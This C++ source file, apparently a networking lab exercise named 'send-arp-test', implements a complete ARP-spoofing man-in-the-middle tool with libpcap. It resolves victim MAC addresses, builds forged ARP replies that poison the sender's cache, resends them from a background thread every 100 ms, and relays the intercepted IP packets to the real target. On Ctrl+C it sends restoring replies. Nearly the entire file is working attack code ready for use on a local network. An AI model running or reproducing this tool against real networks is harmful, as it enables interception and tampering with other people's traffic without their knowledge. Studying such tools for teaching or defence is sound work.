#include <cstdio>
#include <map>
#include <algorithm>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include<stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <libnet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>
#define MX 101
using namespace std;
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
struct find_which_query{
    Ip sender, target;
    bool operator==(const find_which_query&r)const{
        return ((sender==r.sender) & (target==r.target));
    }
    bool operator<(const find_which_query&r)const{
        return sender==r.sender?target<r.target:sender<r.sender;
    }
};
static pthread_t thread;
static int thread_id;
static bool thread_exit = true;
static void* thread_return;

char* dev_recover;
int chk_pck;
int total_flow;
Mac mac_address_mine, mac_address_sender, mac_address_target;
Ip ip_address_mine;
Ip sender_ip_list[MX], target_ip_list[MX];
map <Ip, Mac> ip_mac;
pcap_t* close_handle;
map <find_which_query, int> find_order;
EthArpPacket target_ip_spoofpacket_base, attacking_packet[MX], recovering_packet[MX];

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test ens33\n");
}
void input_format(){
    printf("number of input argument must be even\n");
}

void move_data_handler(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data);
void print_my_mac_address();
void print_sender_mac_address(in_addr sender);
void print_target_mac_address(in_addr target);
int send_arp_spoof(pcap_t* handle, char* dev, in_addr addr_inet_sender,in_addr addr_inet_target);
int setting_my_mac();
void finding_my_ip_address(char *dev);
void attacking_packet_send();
void make_thread_attacking();
void *start_thread_send_attacking_packet_3s();
void make_thread_stop();
void recovering_packet_send(int sig);
EthArpPacket make_spoofing_arp_reply_packet(Ip sender, Ip target, int typ);

int main(int argc, char* argv[]) {

    if (argc < 4) {
        usage();
        return -1;
    }
    if(argc % 2 != 0){
        input_format();
        return -1;
    }
    char* dev = argv[1];
    dev_recover = argv[1];
    signal(SIGINT, recovering_packet_send);
    finding_my_ip_address(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int errmy=setting_my_mac();
    if(errmy==0){
        printf("Handle error on finding my mac address\n");
        return 3;
    }
    printf("if you press ctrl + c, then the program will send arp-recover packets and then it would end!");
    print_my_mac_address();
    ip_mac.insert(make_pair(ip_address_mine, mac_address_mine));

    /*
    map <Ip, Mac>::iterator it;
    it=ip_mac.find(ip_address_mine);
    if(it==ip_mac.end()){
        printf("failed!\n");
        return 1;
    }
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(it->first), str, INET_ADDRSTRLEN);
    printf("%s\n",str);
    for(int i=0;i<Mac::SIZE;i++){
        if(i!=0){
            printf(":");
        }
        printf("%02x",(*it).second.mac_[i]);
    }
    printf("\n");
    */
    int tot_argc=(argc-2)/2;
    total_flow=tot_argc;
    chk_pck=0;

    target_ip_spoofpacket_base.eth_.smac_ = mac_address_mine;
    target_ip_spoofpacket_base.eth_.type_ = htons(EthHdr::Arp);
    target_ip_spoofpacket_base.arp_.hrd_ = htons(ArpHdr::ETHER);
    target_ip_spoofpacket_base.arp_.pro_ = htons(EthHdr::Ip4);
    target_ip_spoofpacket_base.arp_.hln_ = Mac::SIZE;
    target_ip_spoofpacket_base.arp_.pln_ = Ip::SIZE;
    target_ip_spoofpacket_base.arp_.op_ = htons(ArpHdr::Reply);
    target_ip_spoofpacket_base.arp_.smac_ = mac_address_mine;
    /*
     * target_ip_spoofpacket_base.arp_.tmac_ = mac_address_sender;
     * target_ip_spoofpacket_base.arp_.tip_ = addr_inet_sender.s_addr;
     * target_ip_spoofpacket_base.arp_.sip_ = addr_inet_target.s_addr;
     * target_ip_spoofpacket_base.eth_.dmac_ = mac_address_sender;
    */
    for(int j=1;j<=tot_argc;j++){
        chk_pck=j;
        printf("%dth case of sender and target mac address finding started\n",j);
        in_addr addr_inet_sender;
        in_addr addr_inet_target;
        if(!inet_aton(argv[2*j], &addr_inet_sender)){
            printf("invalid IP address : %s\n", argv[2*j]);
            continue;
        }
        if(!inet_aton(argv[2*j+1], &addr_inet_target)){
            printf("invalid IP address : %s\n", argv[2*j+1]);
            continue;;
        }

        sender_ip_list[j]=addr_inet_sender.s_addr;
        target_ip_list[j]=addr_inet_target.s_addr;
        send_arp_spoof(handle, dev, addr_inet_sender, addr_inet_target);
    }
    printf("\narp spoofing started!\n");
    //attacking_packet_send();
    //printf("\n---------------------------------------------------------------\nsending attacking packet\n");
    close_handle=handle;
    //recovering_packet_send(1);



    for(int j=1;j<=total_flow;j++){
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
    }

    close_handle=handle;
    make_thread_attacking();
    //start_thread_send_attacking_packet_3s();

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){
            //pcap_close(handle);
            //handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
            continue;
        }
        if (res == -1 || res == -2) {
            continue;
        }
        EthHdr eth_header;
        memcpy(&eth_header, packet, sizeof(EthHdr));
        int i;
        if(eth_header.type()==(EthHdr::Arp)){//arp
            //broadcast or unicast arp
            //the thing that we have to do is same even if the arp query is different : send arp reply packet
            ArpHdr arp_hdr;
            memcpy(&arp_hdr, packet + sizeof(EthHdr), sizeof(ArpHdr));
            if(arp_hdr.op_!=htons(ArpHdr::Request) || arp_hdr.hrd()!=(ArpHdr::ETHER)){
                continue;//right op code(reply) and hardware type is ether;
            }
            //map <find_which_query, int>::iterator imsi3;
            find_which_query imsiss;
            imsiss.sender=arp_hdr.sip_, imsiss.target=arp_hdr.tip_;
            char str1[INET_ADDRSTRLEN], str2[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(imsiss.sender), str1, INET_ADDRSTRLEN);
            inet_ntop(AF_INET, &(imsiss.target), str2, INET_ADDRSTRLEN);
            //printf("---------------------------------------------------------------\n");
            //printf("arp request packet's sender ip  address!\t: %s\n", str1);
            //printf("arp request packet's target ip  address!\t: %s\n", str2);
            for(i=1;i<=total_flow;i++){
                if(imsiss.sender==target_ip_list[i] || imsiss.target == target_ip_list[i]){
                    //printf("I will send arp-reply to (sender : %s, target : %s) pair\n", argv[2*i], argv[2*i+1]);
                    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(attacking_packet[i])), sizeof(EthArpPacket));
                }
            }

            /*
            imsi3=find_order.find(imsiss);
            if(imsi3==find_order.end()){
                continue;
            }
            */

            //printf("arp request packet that I received is %dth pair!\n", imsi3->second);
            //print_sender_mac_address();
        }
        else if(eth_header.type()==(EthHdr::Ip4)){
            int fl=0;
            for(i=0;i<Mac::SIZE;i++){
                if(eth_header.dmac_[i]!= mac_address_mine.mac_[i]){
                    fl=1;
                    break;
                }
            }
            if(fl==1){
                continue;
            }
            struct libnet_ipv4_hdr *packet_ip=(struct libnet_ipv4_hdr *)(packet + sizeof(EthHdr));
            //printf("IP version : %#02x\n", packet_ip->ip_v);
            //printf("IP protocol : %#02x\n", packet_ip->ip_p);
            Ip ip_packet_sender=packet_ip->ip_src.s_addr;
            Ip ip_packet_target=packet_ip->ip_dst.s_addr;
            char str1[INET_ADDRSTRLEN], str2[INET_ADDRSTRLEN];
            //printf("Src ip : %s \n",inet_ntoa(packet_ip->ip_src));
            //printf("Dst ip : %s \n",inet_ntoa(packet_ip->ip_dst));
            /*
            inet_ntop(AF_INET, &(ip_packet_sender), str, INET_ADDRSTRLEN);
            printf("packet's sender ip  address!\t: %s\n", str);
            inet_ntop(AF_INET, &(ip_packet_target), str, INET_ADDRSTRLEN);
            printf("packet's target ip  address!\t: %s\n", str);
            */
            inet_ntop(AF_INET, &(ip_packet_sender), str1, INET_ADDRSTRLEN);
            inet_ntop(AF_INET, &(ip_packet_target), str2, INET_ADDRSTRLEN);
            map <Ip, Mac>::iterator imsi1, imsi2;
            imsi1=ip_mac.find(ip_packet_sender);
            imsi2=ip_mac.find(ip_packet_target);
            if(imsi1==ip_mac.end() || imsi2==ip_mac.end()){
                continue;
            }
            map <find_which_query, int>::iterator imsi3;
            find_which_query imsiss;
            imsiss.sender=ip_packet_sender, imsiss.target=ip_packet_target;
            imsi3=find_order.find(imsiss);
            if(imsi3==find_order.end()){
                continue;
            }
            for(i=0;i<Mac::SIZE;i++){
                if((imsi1->second).mac_[i]!= eth_header.smac_[i]){
                    fl=1;
                    break;
                }
            }
            if(fl==1){
                continue;
            }

            printf("---------------------------------------------------------------\n");
            printf("Ip packet that I received is %dth pair!\n", imsi3->second);
            printf("packet's sender ip  address!\t: %s\n", str1);
            printf("packet's target ip  address!\t: %s\n", str2);

            for(i=0;i<6;i++){
                eth_header.smac_[i]=mac_address_mine[i];
            }
            for(i=0;i<6;i++){
                eth_header.dmac_[i]=imsi2->second.mac_[i];
            }
            int sizeofether=sizeof(struct EthHdr);
            int packetlength=header->caplen;
            printf("%u bytes captured\n", packetlength);
            int total_packet_length=packet_ip->ip_len;
            printf("IP header, total packet length : %d\n", total_packet_length);
            u_char* imsipacket=(u_char *)malloc(sizeof(u_char) * packetlength);
            //memcpy(imsipacket, packet, packetlength);
            //printf("Original packet that sender must send to target is like \n");
            for(i=0;i<packetlength;i++){
                imsipacket[i]=packet[i];
            }
            //printf("\nspoofed packet that I will send is like \n");
            //printf("\nsizeofethheader %d %d\n",sizeofether, sizeof(eth_header));
            memcpy(imsipacket, &eth_header, sizeofether);
            printf("\nI'll relay sender's packet to target!\n");
            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(imsipacket), packetlength * sizeof(u_char));
        }
    }
    pcap_close(handle);
}
void finding_my_ip_address(char* dev){
    int fd;
    struct ifreq ifr;
    in_addr My_Ip_address;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "ens33" */
    strncpy(ifr.ifr_name, dev, strlen(dev));
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    /* display result */
    printf("My ip address : %s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    inet_aton(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), &My_Ip_address);
    ip_address_mine=My_Ip_address.s_addr;
    return;
}
int send_arp_spoof(pcap_t* handle, char* dev,in_addr addr_inet_sender,in_addr addr_inet_target){
    uint8_t MAC_address[Mac::SIZE];
    int i;
    EthArpPacket packet_broadcast, packet_real;//final packet to send to make arp spoofing

    packet_broadcast.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    /*
    for(i=0;i<6;i++){
        packet_broadcast.eth_.smac_.mac_[i]=MAC_my_address[i];
    }
    */
    packet_broadcast.eth_.smac_ = mac_address_mine;
    packet_broadcast.eth_.type_ = htons(EthHdr::Arp);
    packet_broadcast.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_broadcast.arp_.pro_ = htons(EthHdr::Ip4);
    packet_broadcast.arp_.hln_ = Mac::SIZE;
    packet_broadcast.arp_.pln_ = Ip::SIZE;
    packet_broadcast.arp_.op_ = htons(ArpHdr::Request);
    /*
    for(i=0;i<Mac::SIZE;i++){
       packet_broadcast.arp_.smac_.mac_[i]=MAC_my_address[i];
    }
    */
    packet_broadcast.arp_.smac_ = mac_address_mine;
    packet_broadcast.arp_.sip_ = ip_address_mine;
    //packet_broadcast.arp_.sip_.ip_ = addr_inet_target.s_addr;
    //packet_broadcast.arp_.sip_ = addr_inet_target.s_addr;
    packet_broadcast.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet_broadcast.arp_.tip_ = addr_inet_sender.s_addr;
    //packet_broadcast.arp_.tip_ = addr_inet_sender.s_addr;

    //packet_broadcast_find_target_mac=packet_broadcast;
    //packet_broadcast_find_target_mac.arp_.tip_.ip_=addr_inet_target.s_addr;
    packet_real=packet_broadcast;
    char prt[2][10]={"sender", "target"};
    for(int typeofsenderortarget=0;typeofsenderortarget<2;typeofsenderortarget++){
        if(typeofsenderortarget==1){
            packet_broadcast.arp_.tip_=addr_inet_target.s_addr;
        }
        map <Ip, Mac>::iterator it;
        it=ip_mac.find(packet_broadcast.arp_.tip_);
        if(it!=ip_mac.end()){
            printf("\nI already searched that ip, mac that will be shown below\n");
            if(typeofsenderortarget==0){
                mac_address_sender=(*it).second;
                print_sender_mac_address(addr_inet_sender);
            }
            else{
                mac_address_target=(*it).second;
                print_target_mac_address(addr_inet_target);
            }
            continue;
        }
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
        //u_char chk_same[28];
        //printf("\n%ld\n",sizeof(ArpHdr));
        //memcpy(chk_same, &packet_broadcast.arp_, sizeof(ArpHdr));
        //int packet_number=0;
        for(i=0;i<Mac::SIZE;i++){
            MAC_address[i]=0x00;
        }
        int kk=0;
        while(true){
            usleep(100000);
            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
            int i;
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0){
                kk++;
                if(kk==20){//prt's ip address is wrong!
                    printf("Failed to get %dth %s's mac address!\n",chk_pck,prt[typeofsenderortarget]);
                    return 1;
                }
                continue;
            }
            if (res == -1 || res == -2) {
                //printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                printf("Failed to get %dth %s's mac address!\n",chk_pck,prt[typeofsenderortarget]);
                return 1;
            }
            EthHdr request_arp_eth;
            memcpy(&request_arp_eth, packet, sizeof(EthHdr));
            if(request_arp_eth.type()!=(EthHdr::Arp)){
                continue;
            }

            ArpHdr request_arp, reply_arp;
            request_arp=packet_broadcast.arp_;
            memcpy(&reply_arp, packet+sizeof(EthHdr), sizeof(ArpHdr));
            if(reply_arp.op()!=(ArpHdr::Reply) || reply_arp.hrd()!=(ArpHdr::ETHER)){
                continue;//right op code(reply) and hardware type is ether;
            }
            //if this isn't reply
            //if request_arp's sender ip != reply_arp's target ip
            /*
            if(request_arp.sip_.ip_!=reply_arp.tip_.ip_){
                continue;
            }
            */
            //if request_arp's target ip != reply_arp's senders ip address
            if(request_arp.tip_.ip_!=reply_arp.sip_.ip_){
                continue;
            }

            //if request_arp's source mac == reply_arp's des mac
            /*
            for(i=0;i<Mac::SIZE;i++){
                if(request_arp.smac_[i]!=reply_arp.tmac_[i]){
                    continue;
                }
            }
            */
            for(i=0;i<Mac::SIZE;i++){
                MAC_address[i]=reply_arp.smac_[i];
            }
            //print_sender_mac_address();
            break;
        }
        int cntt=0, cnff=0;
        for(i=0;i<Mac::SIZE;i++){
            if(MAC_address[i]!=0x00){
                cntt=1;
            }
            if(MAC_address[i]!=0xff){
                cnff=1;
            }
        }
        if(cntt==0 || cnff==0){
            printf("Failed to get %dth %s's mac address!\n",chk_pck,prt[typeofsenderortarget]);
            return 1;
        }
        if(typeofsenderortarget==0){
            for(i=0;i<Mac::SIZE;i++){
                mac_address_sender.mac_[i] = MAC_address[i];
            }
            ip_mac.insert(make_pair(packet_broadcast.arp_.tip_,mac_address_sender));
            print_sender_mac_address(addr_inet_sender);
        }
        else{
            for(i=0;i<Mac::SIZE;i++){
                mac_address_target.mac_[i] = MAC_address[i];
            }
            ip_mac.insert(make_pair(packet_broadcast.arp_.tip_,mac_address_target));
            print_target_mac_address(addr_inet_target);
        }
    }
    /*
    //packet_broadcast.arp_.tip_.ip_ = addr_inet_sender.s_addr;
    packet_real.arp_.sip_.ip_ = addr_inet_target.s_addr;
    packet_real.eth_.dmac_ = mac_address_sender;
    packet_real.arp_.tmac_ = mac_address_sender;
    packet_real.arp_.op_ = htons(ArpHdr::Reply);
    */
    packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 1);
    attacking_packet[chk_pck]=packet_real;
    packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 2);
    recovering_packet[chk_pck]=packet_real;
    /*
    packet_real=make_spoofing_arp_reply_packet(addr_inet_sender.s_addr, addr_inet_target.s_addr, 3);
    recovering_packet[chk_pck*2]=packet_real;
    */
    find_which_query imsi_query;
    imsi_query.sender=addr_inet_sender.s_addr;
    imsi_query.target=addr_inet_target.s_addr;

    map <find_which_query, int>::iterator it;
    it=find_order.find(imsi_query);
    if(it==find_order.end()){
        find_order.insert(make_pair(imsi_query, chk_pck));
    }
    return 0;
}
void print_sender_mac_address(in_addr sender){
    int i;
    printf("---------------------------------------------------------------\n");
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(sender), str, INET_ADDRSTRLEN);
    printf("%dth sender's ip  address!\t: %s\n", chk_pck, str);
    printf("%dth sender's mac address!\t: ", chk_pck);
    for(i=0;i<Mac::SIZE;i++){
        if(i!=0){
            printf(":");
        }
        printf("%02x",mac_address_sender.mac_[i]);
    }
    printf("\n---------------------------------------------------------------\n");
}

void print_target_mac_address(in_addr target){
    int i;
    printf("---------------------------------------------------------------\n");
    char str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(target), str, INET_ADDRSTRLEN);
    printf("%dth target's ip  address!\t: %s\n", chk_pck, str);
    printf("%dth target's mac address!\t: ", chk_pck);
    for(i=0;i<Mac::SIZE;i++){
        if(i!=0){
            printf(":");
        }
        printf("%02x",mac_address_target.mac_[i]);
    }
    printf("\n---------------------------------------------------------------\n");
}

/*
 *
 * copy and pasted from
 * https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
 * */
int setting_my_mac(){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) {
        /* handle error*/
        return 0;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
        /* handle error */
        return 0;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
            /* handle error */
            return 0;
        }
    }
    if (success){
        unsigned char mac_address[6];
        memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
        int i;
        for(i=0;i<ETHER_ADDR_LEN;i++){
            //MAC_my_address[i]=static_cast<uint8_t>(mac_address[i]);
            mac_address_mine.mac_[i]=static_cast<uint8_t>(mac_address[i]);
        }
    }
    return success;
}
void print_my_mac_address(){
    int i;
    //setting on MAC_my_address
    printf("I got my mac address!\nMy mac address : ");
    for(i=0;i<ETHER_ADDR_LEN;i++){
        if(i!=0){
            printf(":");
        }
        //printf("%02x",MAC_my_address[i]);
        printf("%02x",mac_address_mine.mac_[i]);
    }
    printf("\n");
}
EthArpPacket make_spoofing_arp_reply_packet(Ip sender, Ip target, int typ){
    EthArpPacket imsi;
    imsi=target_ip_spoofpacket_base;
    /*
     * target_ip_spoofpacket_base.arp_.tmac_ = mac_address_sender;
     * target_ip_spoofpacket_base.arp_.tip_.ip_ = addr_inet_sender.s_addr;
     * target_ip_spoofpacket_base.arp_.sip_.ip_ = addr_inet_target.s_addr;
     * target_ip_spoofpacket_base.eth_.dmac_ = mac_address_sender;
    */
    map <Ip, Mac>::iterator it, it2;
    it=ip_mac.find(sender);
    it2=ip_mac.find(target);
    imsi.eth_.dmac_ = it->second;
    imsi.arp_.smac_ = mac_address_mine;
    imsi.arp_.sip_  = target;
    imsi.arp_.tmac_ = it->second;
    imsi.arp_.tip_  = sender;
    if(typ==2){//sender properly knows target's mac address
        imsi.eth_.dmac_ = it->second;
        imsi.arp_.smac_ = it2->second;
        imsi.arp_.sip_  = target;
        imsi.arp_.tmac_ = it->second;
        imsi.arp_.tip_  = sender;
    }
    /*
    else if(typ==3){//target properly knows sender's mac address
        imsi.eth_.dmac_ = it2->second;
        imsi.arp_.smac_ = it->second;
        imsi.arp_.sip_  = sender;
        imsi.arp_.tmac_ = it2->second;
        imsi.arp_.tip_  = target;
    }
    */
    return imsi;
}
void recovering_packet_send(int sig){
    int i;
    make_thread_stop();//ctrl + C --> stop sending arp reply packet!
    printf("\n---------------------------------------------------------------\nProgram will send recover arp reply packet and terminate!\n");
    for(int zz=0;zz<3;zz++){
        sleep(1);
        for(i=1;i<=total_flow;i++){
            //printf("\n%d\n", i);
            pcap_sendpacket(close_handle, reinterpret_cast<const u_char*>(&(recovering_packet[i])), sizeof(EthArpPacket));
        }
        printf("%dth recover packet send!\n",zz+1);
    }
    pcap_close(close_handle);
    exit(sig);
}
void attacking_packet_send(){
    //printf("\n---------------------------------------------------------------\nsending attacking packet\n");
    for(int j=1;j<=total_flow;j++){
        pcap_sendpacket(close_handle, reinterpret_cast<const u_char*>(&(attacking_packet[j])), sizeof(EthArpPacket));
    }
}
void* start_thread_send_attacking_packet_3s(void *arg){
    for(;;){
        if(thread_exit==true){
            break;
        }
        usleep(100000);
        attacking_packet_send();
    }
    pthread_exit((void*)0);
    return NULL;
}
void make_thread_attacking(){
    thread_exit  = false;
    thread_id = pthread_create(&thread, NULL, start_thread_send_attacking_packet_3s, NULL);
}
void make_thread_stop(){
    thread_exit = true;
    thread_id = pthread_join(thread, &thread_return);
}
